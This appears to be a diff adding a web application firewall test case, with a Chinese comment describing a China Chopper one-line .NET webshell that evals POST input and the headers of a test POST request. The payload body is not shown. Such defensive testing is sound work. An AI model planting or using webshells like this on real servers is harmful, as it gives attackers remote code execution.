@@ -1,0 +1,10 @@
+# webshell_chinachop_eval
+# 采用.NET框架所写的一句话木马，使用chinachop webshell管理工具进行连接，该脚本将调用 JScript“eval”函数来执行给定 POST 请求变量中的字符串。
+POST /?bid=hd_tag_m8mv24iz HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24iz
+RM-PRO-Token: aed3de91f6ae42e0f099b945d62971f9
+RM-PRO-Time: 1742808385490
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=k5FUUs6gGnYj2RAzddb4FYWaIHRviSdt
+
